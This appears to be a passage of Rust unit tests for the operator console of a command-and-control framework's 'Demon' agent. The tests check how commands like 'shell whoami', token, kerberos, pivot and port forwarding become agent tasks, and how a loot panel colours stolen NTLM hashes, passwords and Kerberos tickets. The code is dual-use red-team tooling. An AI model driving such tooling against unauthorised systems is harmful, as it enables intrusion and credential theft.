    fn format_console_prompt_uses_fallback_when_operator_empty() {
        let prompt = format_console_prompt("", "DEAD1234");
        assert_eq!(prompt, "[operator/DEAD1234] demon.x64 >> ");
    }

    // ---- help command tests ----

    #[test]
    fn handle_local_command_help_returns_command_table() {
        let output = handle_local_command("help").expect("help should be handled locally");
        assert!(output.contains("Demon Commands"));
        assert!(output.contains("Command"));
        assert!(output.contains("Type"));
        assert!(output.contains("Description"));
        // Verify a sample of commands appear in the table.
        assert!(output.contains("shell"));
        assert!(output.contains("sleep"));
        assert!(output.contains("token"));
        assert!(output.contains("inline-execute"));
    }

    #[test]
    fn handle_local_command_help_specific_command() {
        let output = handle_local_command("help shell").expect("help shell should be handled");
        assert!(output.contains("shell"));
        assert!(output.contains("Usage:"));
        assert!(output.contains("Description:"));
    }

    #[test]
    fn handle_local_command_help_unknown_topic() {
        let output = handle_local_command("help nonexistent").expect("should still return output");
        assert!(output.contains("Unknown command"));
    }

    #[test]
    fn handle_local_command_question_mark_alias() {
        let output = handle_local_command("?").expect("? should work as help alias");
        assert!(output.contains("Demon Commands"));
    }

    #[test]
    fn handle_local_command_returns_none_for_remote_commands() {
        assert!(handle_local_command("ps").is_none());
        assert!(handle_local_command("shell whoami").is_none());
        assert!(handle_local_command("sleep 10").is_none());
    }

    // ---- new command dispatch tests ----

    #[test]
    fn build_console_task_shell_command() {
        let result = build_console_task("ABCD1234", "shell whoami", "operator");
        let msg = result.unwrap_or_else(|e| panic!("shell task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandInlineExecute).to_string());
        assert_eq!(info.arguments.as_deref(), Some("whoami"));
    }

    #[test]
    fn build_console_task_sleep_with_jitter() {
        let result = build_console_task("ABCD1234", "sleep 30 50%", "operator");
        let msg = result.unwrap_or_else(|e| panic!("sleep task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandSleep).to_string());
        assert_eq!(info.arguments.as_deref(), Some("30;50"));
    }

    #[test]
    fn build_console_task_sleep_without_jitter() {
        let result = build_console_task("ABCD1234", "sleep 10", "operator");
        let msg = result.unwrap_or_else(|e| panic!("sleep task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.arguments.as_deref(), Some("10;0"));
    }

    #[test]
    fn build_console_task_sleep_rejects_missing_delay() {
        let result = build_console_task("ABCD1234", "sleep", "operator");
        assert!(result.is_err());
    }

    #[test]
    fn build_console_task_dir_uses_explorer_format() {
        let result = build_console_task("ABCD1234", "dir C:\\Temp", "operator");
        let msg = result.unwrap_or_else(|e| panic!("dir task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("dir"));
        assert!(info.arguments.as_deref().unwrap_or_default().contains("C:\\Temp"));
    }

    #[test]
    fn build_console_task_cp_requires_two_args() {
        let result = build_console_task("ABCD1234", "cp /tmp/a", "operator");
        assert!(result.is_err());
    }

    #[test]
    fn build_console_task_cp_sends_both_paths() {
        let result = build_console_task("ABCD1234", "cp /tmp/a /tmp/b", "operator");
        let msg = result.unwrap_or_else(|e| panic!("cp task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.sub_command.as_deref(), Some("cp"));
        assert_eq!(info.arguments.as_deref(), Some("/tmp/a;/tmp/b"));
    }

    #[test]
    fn build_console_task_mv_sends_both_paths() {
        let result = build_console_task("ABCD1234", "mv /tmp/a /tmp/b", "operator");
        let msg = result.unwrap_or_else(|e| panic!("mv task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.sub_command.as_deref(), Some("move"));
    }

    #[test]
    fn build_console_task_token_list() {
        let result = build_console_task("ABCD1234", "token list", "operator");
        let msg = result.unwrap_or_else(|e| panic!("token task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandToken).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("list"));
    }

    #[test]
    fn build_console_task_token_requires_subcommand() {
        let result = build_console_task("ABCD1234", "token", "operator");
        assert!(result.is_err());
    }

    #[test]
    fn build_console_task_net_domain() {
        let result = build_console_task("ABCD1234", "net domain", "operator");
        let msg = result.unwrap_or_else(|e| panic!("net task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandNet).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("domain"));
    }

    #[test]
    fn build_console_task_config_sets_subcommand() {
        let result = build_console_task("ABCD1234", "config sleep-obf true", "operator");
        let msg = result.unwrap_or_else(|e| panic!("config task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandConfig).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("sleep-obf"));
        assert_eq!(info.arguments.as_deref(), Some("true"));
    }

    #[test]
    fn build_console_task_pivot_requires_subcommand() {
        let result = build_console_task("ABCD1234", "pivot", "operator");
        assert!(result.is_err());
    }

    #[test]
    fn build_console_task_kerberos_luid() {
        let result = build_console_task("ABCD1234", "kerberos luid", "operator");
        let msg = result.unwrap_or_else(|e| panic!("kerberos task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandKerberos).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("luid"));
    }

    #[test]
    fn build_console_task_rportfwd_list() {
        let result = build_console_task("ABCD1234", "rportfwd list", "operator");
        let msg = result.unwrap_or_else(|e| panic!("rportfwd task should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandSocket).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("rportfwd list"));
    }

    #[test]
    fn build_console_task_proc_modules() {
        let result = build_console_task("ABCD1234", "proc modules", "operator");
        let msg = result.unwrap_or_else(|e| panic!("proc modules should build: {e}"));
        let (_, info) = unwrap_agent_task(msg);
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandProc).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("modules"));
    }

    #[test]
    fn build_console_task_proc_invalid_subcommand() {
        let result = build_console_task("ABCD1234", "proc bogus", "operator");
        assert!(result.is_err());
    }

    #[test]
    fn build_console_task_help_is_not_dispatched_remotely() {
        let result = build_console_task("ABCD1234", "help", "operator");
        assert!(result.is_err(), "help should not produce a remote task");
    }

    #[test]
    fn build_help_output_full_table_lists_all_commands() {
        let output = build_help_output(None);
        for spec in &CONSOLE_COMMANDS {
            assert!(output.contains(spec.name), "help table should contain `{}`", spec.name);
        }
    }

    #[test]
    fn build_help_output_specific_command_shows_details() {
        let output = build_help_output(Some("token"));
        assert!(output.contains("token"));
        assert!(output.contains("Usage:"));
        assert!(output.contains("Type:"));
        assert!(output.contains("Description:"));
    }

    #[test]
    fn build_help_output_alias_resolves() {
        let output = build_help_output(Some("bof"));
        assert!(output.contains("inline-execute"));
    }

    #[test]
    fn console_commands_all_have_descriptions() {
        for spec in &CONSOLE_COMMANDS {
            assert!(!spec.description.is_empty(), "command `{}` missing description", spec.name);
            assert!(!spec.cmd_type.is_empty(), "command `{}` missing type", spec.name);
            assert!(!spec.usage.is_empty(), "command `{}` missing usage", spec.name);
        }
    }

    #[test]
    fn console_commands_names_are_unique() {
        let mut seen = std::collections::HashSet::new();
        for spec in &CONSOLE_COMMANDS {
            assert!(seen.insert(spec.name), "duplicate command name: {}", spec.name);
        }
    }

    #[test]
    fn completion_includes_new_commands() {
        let all = console_completion_candidates("");
        assert!(all.contains(&"shell"));
        assert!(all.contains(&"sleep"));
        assert!(all.contains(&"token"));
        assert!(all.contains(&"inline-execute"));
        assert!(all.contains(&"net"));
        assert!(all.contains(&"config"));
        assert!(all.contains(&"help"));
    }

    #[test]
    fn completion_pivot_matches_p_prefix() {
        let matches = console_completion_candidates("pi");
        assert!(matches.contains(&"pivot"));
    }

    // ── Loot panel types ─────────────────────────────────────────────────

    #[test]
    fn loot_tab_default_is_credentials() {
        assert_eq!(LootTab::default(), LootTab::Credentials);
    }

    #[test]
    fn credential_sort_column_default_is_name() {
        assert_eq!(CredentialSortColumn::default(), CredentialSortColumn::Name);
    }

    #[test]
    fn loot_panel_state_default_values() {
        let state = LootPanelState::default();
        assert_eq!(state.active_tab, LootTab::Credentials);
        assert!(state.selected_screenshot.is_none());
        assert!(!state.cred_sort_desc);
    }

    #[test]
    fn credential_category_color_returns_distinct_colors() {
        let ntlm_item = LootItem {
            id: Some(1),
            kind: LootKind::Credential,
            name: "NTLM hash".to_owned(),
            agent_id: String::new(),
            source: String::new(),
            collected_at: String::new(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: None,
        };
        let plain_item = LootItem {
            id: Some(2),
            kind: LootKind::Credential,
            name: "plaintext password".to_owned(),
            agent_id: String::new(),
            source: String::new(),
            collected_at: String::new(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: None,
        };
        let ntlm_color = credential_category_color(&ntlm_item);
        let plain_color = credential_category_color(&plain_item);
        assert_ne!(ntlm_color, plain_color);
    }

    #[test]
    fn credential_category_color_kerberos_and_certificate() {
        let kerb = LootItem {
            id: Some(3),
            kind: LootKind::Credential,
            name: "kerberos ticket".to_owned(),
            agent_id: String::new(),
            source: String::new(),
            collected_at: String::new(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: None,
        };
        let cert = LootItem {
            id: Some(4),
            kind: LootKind::Credential,
            name: "certificate".to_owned(),
            agent_id: String::new(),
            source: String::new(),
            collected_at: String::new(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: None,
        };
        let kerb_color = credential_category_color(&kerb);
        let cert_color = credential_category_color(&cert);
        assert_ne!(kerb_color, cert_color);
        // Kerberos = purple, Certificate = cyan
        assert_eq!(kerb_color, Color32::from_rgb(140, 120, 220));
        assert_eq!(cert_color, Color32::from_rgb(80, 180, 220));
    }

    #[test]
    fn credential_category_color_unknown_returns_gray() {
        let unknown = LootItem {
            id: Some(5),
            kind: LootKind::Credential,
            name: "some random cred".to_owned(),
            agent_id: String::new(),
            source: String::new(),
            collected_at: String::new(),
            file_path: None,
            size_bytes: None,
            content_base64: None,
            preview: None,
        };
        assert_eq!(credential_category_color(&unknown), Color32::GRAY);
    }

    #[test]
    fn screenshot_texture_cache_debug_shows_count() {
        let cache = ScreenshotTextureCache::default();
        let debug = format!("{cache:?}");
        assert!(debug.contains("count"));
        assert!(debug.contains('0'));
    }
}
